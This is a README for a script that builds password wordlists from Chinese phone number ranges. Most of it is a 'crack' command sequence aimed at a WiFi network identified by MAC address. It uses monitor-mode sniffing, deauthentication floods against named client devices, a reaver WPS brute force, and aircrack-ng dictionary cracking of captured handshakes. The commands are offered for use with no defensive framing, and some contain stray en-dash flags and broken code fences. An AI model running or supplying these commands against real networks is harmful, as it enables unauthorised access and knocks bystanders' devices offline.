# Generate dictionary based on Chinese phone number

## Usage
Set priority in table `province_priority` to adjust the sequence of the province in dict, priority 0 will not be generated.

`fetch_url.py` fetches all phone number regions from [www.51hao.cc](http://www.51hao.cc)
`load_phone_region.py` loads phone numbers to sqlitedb
`phone_dict_gen.py` will generate the phone dicts

## Crack cmd
```bash
# Enable monitor mode
sudo airmon-ng start wlan0
```

# Sniff
# Sniff wifi, -c CHANNEL
rm -fr *.cap && sudo airodump-ng --wps -w wpa wlan1mon -c 6

###################################################################
# tgt is the target wifi to crack, clientvic is the client to deauth
tgt=8C:18:50:56:2B:28

# Collect the handshake cap
sudo rm -fr *.cap && sudo airodump-ng --bssid ${tgt} -w ${tgt}.cap wlan1mon -c 2

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# Deauth the client
tgt=8C:18:50:56:2B:28

clientvic=14:5F:94:8C:AA:BF
sudo aireplay-ng -0 10 -a ${tgt} -c ${clientvic} wlan1mon
clientvic=74:E2:F5:33:23:D4
sudo aireplay-ng -0 10 -a ${tgt} -c ${clientvic} wlan1mon

###################################################################

sudo reaver -i wlan1mon -b ${tgt} –a –S –vv –d 0  -c 11


caps=BC-5F-F6-B2-6B-02_handshake.cap

# Check SSID
aircrack-ng  -J wpahash ${caps}

# Crack
aircrack-ng -l wpakey.txt -w ~/phone_dict_gen/phone.dict ${caps}
```
